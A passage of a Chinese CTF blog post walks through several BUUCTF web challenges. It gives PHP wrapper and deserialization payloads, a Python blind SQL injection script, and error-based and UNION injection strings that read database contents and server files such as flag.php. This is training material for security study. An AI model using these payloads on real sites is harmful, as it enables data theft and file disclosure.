&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;先来一段&lt;a class="link" href="https://segmentfault.com/a/1190000018991087" target="_blank" rel="noopener"
&gt;PHP伪协议总结&lt;/a&gt;，这题的第一步是判断传入text参数并读取内容，判断内容为&lt;strong&gt;welcome to the zjctf&lt;/strong&gt;，使用&lt;code&gt;data://&lt;/code&gt;伪协议。&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;?text=data://text/plain,welcome to the zjctf
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;接下来是文件包含，有了提示&lt;code&gt;useless.php&lt;/code&gt;肯定要读一读看看，使用&lt;code&gt;php://filter&lt;/code&gt;伪协议。&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;?text=data://text/plain,welcome to the zjctf&amp;amp;file=php://filter/convert.base64-encode/resource=useless.php
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;得到的内容&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;?php
class Flag{ //flag.php
public $file;
public function __tostring(){
if(isset($this-&amp;gt;file)){
echo file_get_contents($this-&amp;gt;file);
echo &amp;#34;&amp;lt;br&amp;gt;&amp;#34;;
return (&amp;#34;U R SO CLOSE !///COME ON PLZ&amp;#34;);
}
}
}
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;并且文件包含下面有一个反序列化，又看到了&lt;code&gt;__tostring&lt;/code&gt;函数，&lt;strong&gt;当一个对象被当作字符串对待的时候，会触发这个魔术方法&lt;/strong&gt;。我构造的对象&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;?php
class Flag{
public $file=&amp;#34;flag.php&amp;#34;;
}
$f = new Flag();
echo serialize($f);
//O:4:&amp;#34;Flag&amp;#34;:1:{s:4:&amp;#34;file&amp;#34;;s:8:&amp;#34;flag.php&amp;#34;;}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;在传入对象之前当然要把读取文件流改为正常包含文件了。最终payload&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;?text=data://text/plain,welcome to the zjctf&amp;amp;file=useless.php&amp;amp;password=O:4:&amp;#34;Flag&amp;#34;:1:{s:4:&amp;#34;file&amp;#34;;s:8:&amp;#34;flag.php&amp;#34;;}
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h1 id="ciscn2019-华北赛区-day2-web1hack-world"&gt;[CISCN2019 华北赛区 Day2 Web1]Hack World
&lt;/h1&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210307171921.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;很明显的sql注入，随便尝试一些语句有&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;1 &amp;raquo; Hello, glzjin wants a girlfriend.&lt;/p&gt;
&lt;p&gt;2 &amp;raquo; Do you want to be my girlfriend?&lt;/p&gt;
&lt;p&gt;3之后都是 &amp;raquo; Error Occured When Fetch Result.&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;输入一个单引号&lt;code&gt;1'&lt;/code&gt;出现了&lt;code&gt;bool(false)&lt;/code&gt;，是一个布尔类型返回，就很有可能是盲注之类的。测试的时候还发现空格被过滤了，空格被过滤可以尝试使用TAB制表符代替。&lt;/p&gt;
&lt;p&gt;题目中也有提示&lt;/p&gt;
&lt;blockquote&gt;
&lt;h3 id="all-you-want-is-in-table-flag-and-the-column-is-flag"&gt;All You Want Is In Table &amp;lsquo;flag&amp;rsquo; and the column is &amp;lsquo;flag&amp;rsquo;
&lt;/h3&gt;&lt;/blockquote&gt;
&lt;p&gt;说明flag在flag表的flag字段中。以下是一个布尔盲注的脚本，思路就是查询flag的值使用&lt;code&gt;substr&lt;/code&gt;函数每次截取一个字符，获得其&lt;code&gt;ascii&lt;/code&gt;值再使用二分法确定具体的值，最后拼接输出。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; requests
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; time
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;url &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;http://26670c55-697e-4520-ae0a-bd23a786cd72.node3.buuoj.cn/&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;result &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;for&lt;/span&gt; x &lt;span style="color:#f92672"&gt;in&lt;/span&gt; range(&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;, &lt;span style="color:#ae81ff"&gt;50&lt;/span&gt;):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; high &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;127&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; low &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;32&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; mid &lt;span style="color:#f92672"&gt;=&lt;/span&gt; (low &lt;span style="color:#f92672"&gt;+&lt;/span&gt; high) &lt;span style="color:#f92672"&gt;//&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;while&lt;/span&gt; high&lt;span style="color:#f92672"&gt;&amp;gt;&lt;/span&gt;low:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; payload &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;if(ascii(substr((select flag from flag),&lt;/span&gt;&lt;span style="color:#e6db74"&gt;%d&lt;/span&gt;&lt;span style="color:#e6db74"&gt;,1))&amp;gt;&lt;/span&gt;&lt;span style="color:#e6db74"&gt;%d&lt;/span&gt;&lt;span style="color:#e6db74"&gt;,1,2)&amp;#34;&lt;/span&gt; &lt;span style="color:#f92672"&gt;%&lt;/span&gt; (x, mid)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; data &lt;span style="color:#f92672"&gt;=&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;id&amp;#34;&lt;/span&gt;:payload
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; time&lt;span style="color:#f92672"&gt;.&lt;/span&gt;sleep(&lt;span style="color:#ae81ff"&gt;0.3&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; response &lt;span style="color:#f92672"&gt;=&lt;/span&gt; requests&lt;span style="color:#f92672"&gt;.&lt;/span&gt;post(url, data &lt;span style="color:#f92672"&gt;=&lt;/span&gt; data)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;Hello&amp;#39;&lt;/span&gt; &lt;span style="color:#f92672"&gt;in&lt;/span&gt; response&lt;span style="color:#f92672"&gt;.&lt;/span&gt;text:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; low&lt;span style="color:#f92672"&gt;=&lt;/span&gt;mid&lt;span style="color:#f92672"&gt;+&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; high &lt;span style="color:#f92672"&gt;=&lt;/span&gt; mid
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; mid &lt;span style="color:#f92672"&gt;=&lt;/span&gt; (low&lt;span style="color:#f92672"&gt;+&lt;/span&gt;high)&lt;span style="color:#f92672"&gt;/&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; result &lt;span style="color:#f92672"&gt;+=&lt;/span&gt; chr(int(mid))
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; print(result)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#flag{929c8993-2d85-4fbf-8e48-7c457551105e}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
&lt;h1 id="极客大挑战-2019hardsql"&gt;[极客大挑战 2019]HardSQL
&lt;/h1&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210307173126.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;还是sql注入题。尝试在输入框里输入&lt;code&gt;#&lt;/code&gt;、&lt;code&gt;--+&lt;/code&gt;时被拦下了，但是在url中使用%23通过了。尝试了union但是被过滤了，使用双写也不通过，和这道题同类型的题前面有Baby SQL、Easy SQL，考点还剩下的有盲注、报错注入、堆叠注入。尝试报错注入可以使用，我参考的&lt;a class="link" href="https://www.cnblogs.com/wocalieshenmegui/p/5917967.html" target="_blank" rel="noopener"
&gt;十种MySQL报错注入&lt;/a&gt;。还需要注意空格是会被拦下的，url编码也不能通过，所以在语句中的表名需要使用&lt;code&gt;()&lt;/code&gt;隔开，具体payload如下：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;爆表&lt;/li&gt;
&lt;/ol&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-sql" data-lang="sql"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;?&lt;/span&gt;username&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#66d9ef"&gt;admin&lt;/span&gt;&lt;span style="color:#f92672"&gt;%&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;27&lt;/span&gt;&lt;span style="color:#66d9ef"&gt;or&lt;/span&gt;(extractvalue(&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;,concat(&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;x7e,(&lt;span style="color:#66d9ef"&gt;select&lt;/span&gt;(group_concat(&lt;span style="color:#66d9ef"&gt;table_name&lt;/span&gt;))&lt;span style="color:#66d9ef"&gt;from&lt;/span&gt;(information_schema.tables)&lt;span style="color:#66d9ef"&gt;where&lt;/span&gt;(table_schema)&lt;span style="color:#66d9ef"&gt;like&lt;/span&gt;(&lt;span style="color:#66d9ef"&gt;database&lt;/span&gt;())),&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;x7e)))&lt;span style="color:#f92672"&gt;%&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;23&lt;/span&gt;&lt;span style="color:#f92672"&gt;&amp;amp;&lt;/span&gt;password&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;当前表名是：H4rDsq1&lt;/p&gt;
&lt;ol start="2"&gt;
&lt;li&gt;爆字段&lt;/li&gt;
&lt;/ol&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-sql" data-lang="sql"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;?&lt;/span&gt;username&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#66d9ef"&gt;admin&lt;/span&gt;&lt;span style="color:#f92672"&gt;%&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;27&lt;/span&gt;&lt;span style="color:#66d9ef"&gt;or&lt;/span&gt;(extractvalue(&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;,concat(&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;x7e,(&lt;span style="color:#66d9ef"&gt;select&lt;/span&gt;(group_concat(&lt;span style="color:#66d9ef"&gt;column_name&lt;/span&gt;))&lt;span style="color:#66d9ef"&gt;from&lt;/span&gt;(information_schema.columns)&lt;span style="color:#66d9ef"&gt;where&lt;/span&gt;(&lt;span style="color:#66d9ef"&gt;table_name&lt;/span&gt;)&lt;span style="color:#66d9ef"&gt;like&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;H4rDsq1&amp;#39;&lt;/span&gt;)),&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;x7e)))&lt;span style="color:#f92672"&gt;%&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;23&lt;/span&gt;&lt;span style="color:#f92672"&gt;&amp;amp;&lt;/span&gt;password&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;当前表的字段有：id,username,password&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;出数据&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;如果使用正常的查询语句会因为flag的长度太长，页面中的回显长度不能显示全，但是可以使用&lt;code&gt;left&lt;/code&gt;和&lt;code&gt;right&lt;/code&gt;函数：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;语法：LEFT(ARG,LENGTH)、RIGHT(ARG,LENGTH)&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;这两个函数会用到选取的长度，如果想要拼成一个完整的flag，可以先用length查看总长度，计算以后拼一下&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-sql" data-lang="sql"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;?&lt;/span&gt;username&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#66d9ef"&gt;admin&lt;/span&gt;&lt;span style="color:#f92672"&gt;%&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;27&lt;/span&gt;&lt;span style="color:#66d9ef"&gt;or&lt;/span&gt;(extractvalue(&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;,concat(&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;x7e,(&lt;span style="color:#66d9ef"&gt;select&lt;/span&gt;(&lt;span style="color:#66d9ef"&gt;left&lt;/span&gt;(password,&lt;span style="color:#ae81ff"&gt;35&lt;/span&gt;))&lt;span style="color:#66d9ef"&gt;from&lt;/span&gt;(H4rDsq1)),&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;x7e)))&lt;span style="color:#f92672"&gt;%&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;23&lt;/span&gt;&lt;span style="color:#f92672"&gt;&amp;amp;&lt;/span&gt;password&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;flag{112bb5db-17a4-47e2-97b4-19&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-sql" data-lang="sql"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;?&lt;/span&gt;username&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#66d9ef"&gt;admin&lt;/span&gt;&lt;span style="color:#f92672"&gt;%&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;27&lt;/span&gt;&lt;span style="color:#66d9ef"&gt;or&lt;/span&gt;(extractvalue(&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;,concat(&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;x7e,(&lt;span style="color:#66d9ef"&gt;select&lt;/span&gt;(&lt;span style="color:#66d9ef"&gt;right&lt;/span&gt;(password,&lt;span style="color:#ae81ff"&gt;11&lt;/span&gt;))&lt;span style="color:#66d9ef"&gt;from&lt;/span&gt;(H4rDsq1)),&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;x7e)))&lt;span style="color:#f92672"&gt;%&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;23&lt;/span&gt;&lt;span style="color:#f92672"&gt;&amp;amp;&lt;/span&gt;password&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;dc295a017f}&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id="网鼎杯-2018fakebook"&gt;[网鼎杯 2018]Fakebook
&lt;/h1&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210307174819.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;是一个展示自己博客网址的列表，先随便注册一个&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210307175313.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;我填的是baidu的网址23333。这时的url是：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code class="language-url" data-lang="url"&gt;http://2cefe2a5-4e68-44ce-870c-3628c2500cd3.node3.buuoj.cn/view.php?no=1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;看到了no=1，应该想到了sql注入，我没有试出什么名堂，但是在网上找到了一个这道题的非预期解：[&lt;a class="link" href="https://www.cnblogs.com/kevinbruce656/p/12643338.html" target="_blank" rel="noopener"
&gt;网鼎杯2018]fakebook题解&lt;/a&gt;，使用了&lt;code&gt;load_file&lt;/code&gt;函数直接读取了flag文件。同样是空格被过滤，但是可以使用&lt;code&gt;/**/&lt;/code&gt;绕过。&lt;/p&gt;
&lt;h2 id="非预期解"&gt;非预期解
&lt;/h2&gt;&lt;pre tabindex="0"&gt;&lt;code class="language-code" data-lang="code"&gt;?no=-1 union/**/select 1,2,3,4
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;先使用上面的语句查看回显点。&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210307180356.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;找的了位置2的回显点，可以把函数替换在2的位置上。&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code class="language-code" data-lang="code"&gt;?no=-1 union/**/select 1,load_file(&amp;#39;/var/www/html/flag.php&amp;#39;),3,4
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;参考师傅的博客中是使用了盲注获得flag的，其实执行以后使用页面的选取工具选取回显的标签块，可以在注释里找的到🤣&lt;/p&gt;
&lt;h2 id="预期解"&gt;预期解
&lt;/h2&gt;&lt;p&gt;正常的sql注入一套查询，同样是使用&lt;code&gt;/**/&lt;/code&gt;绕过空格过滤。&lt;/p&gt;
&lt;p&gt;爆表&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code class="language-code" data-lang="code"&gt;?no=-1%20union/***/select%201,group_concat(table_name),3,4%20from%20information_schema.tables%20where%20table_schema=database()%23
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;爆字段&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code class="language-code" data-lang="code"&gt;?no=-1 union/***/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&amp;#39;users&amp;#39; %23
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;出数据&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code class="language-code" data-lang="code"&gt;?no=-1 union/***/select 1,group_concat(no,username,passwd,data),3,4 from users
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;查询的结果是一大串字符串，但是在结尾一个PHP的序列化对象：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code class="language-code" data-lang="code"&gt;O:8:&amp;#34;UserInfo&amp;#34;:3:{s:4:&amp;#34;name&amp;#34;;s:7:&amp;#34;guobang&amp;#34;;s:3:&amp;#34;age&amp;#34;;i:18;s:4:&amp;#34;blog&amp;#34;;s:20:&amp;#34;http://www.baidu.com&amp;#34;;}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;说明网站是使用反序列化获取对应栏的数据，下面有一个iframe的标签，根据提示&lt;strong&gt;the contents of his/her blog&lt;/strong&gt;，得知我们提供的网址会在这里显示，正好有一个php伪协议file://可以读取本地文件，思路就是：&lt;strong&gt;使用伪协议读取flag作为blog网站回显在iframe的标签中&lt;/strong&gt;，所以构造一个序列化对象。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;&amp;lt;?&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;php&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;class&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;UserInfo&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;public&lt;/span&gt; $name &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;guobang&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;public&lt;/span&gt; $age &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;18&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;public&lt;/span&gt; $blog &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;file:///var/www/html/flag.php&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$s &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;new&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;UserInfo&lt;/span&gt;();
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;echo&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;serialize&lt;/span&gt;($s);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;//O:8:&amp;#34;UserInfo&amp;#34;:3:{s:4:&amp;#34;name&amp;#34;;s:7:&amp;#34;guobang&amp;#34;;s:3:&amp;#34;age&amp;#34;;i:18;s:4:&amp;#34;blog&amp;#34;;s:29:&amp;#34;file:///var/www/html/flag.php&amp;#34;;}
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;最终payload&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code class="language-code" data-lang="code"&gt;?no=-1%20union/***/select%201,2,3,&amp;#39;O:8:&amp;#34;UserInfo&amp;#34;:3:{s:4:&amp;#34;name&amp;#34;;s:7:&amp;#34;guobang&amp;#34;;s:3:&amp;#34;age&amp;#34;;i:18;s:4:&amp;#34;blog&amp;#34;;s:29:&amp;#34;file:///var/www/html/flag.php&amp;#34;;}&amp;#39; from%20users
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;在iframe里面找，是一个data:text/html的数据格式，base64加密的噢。&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id="网鼎杯-2020-青龙组areuserialz"&gt;[网鼎杯 2020 青龙组]AreUSerialz
&lt;/h1&gt;&lt;p&gt;部分图&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210308102316.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;最下面有对于payload的限制：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;function&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;is_valid&lt;/span&gt;($s) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;for&lt;/span&gt;($i &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;; $i &lt;span style="color:#f92672"&gt;&amp;lt;&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;strlen&lt;/span&gt;($s); $i&lt;span style="color:#f92672"&gt;++&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;(&lt;span style="color:#f92672"&gt;!&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;ord&lt;/span&gt;($s[$i]) &lt;span style="color:#f92672"&gt;&amp;gt;=&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;32&lt;/span&gt; &lt;span style="color:#f92672"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;ord&lt;/span&gt;($s[$i]) &lt;span style="color:#f92672"&gt;&amp;lt;=&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;125&lt;/span&gt;))
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;false&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;true&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;isset&lt;/span&gt;($_GET{&lt;span style="color:#e6db74"&gt;&amp;#39;str&amp;#39;&lt;/span&gt;})) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $str &lt;span style="color:#f92672"&gt;=&lt;/span&gt; (&lt;span style="color:#a6e22e"&gt;string&lt;/span&gt;)$_GET[&lt;span style="color:#e6db74"&gt;&amp;#39;str&amp;#39;&lt;/span&gt;];
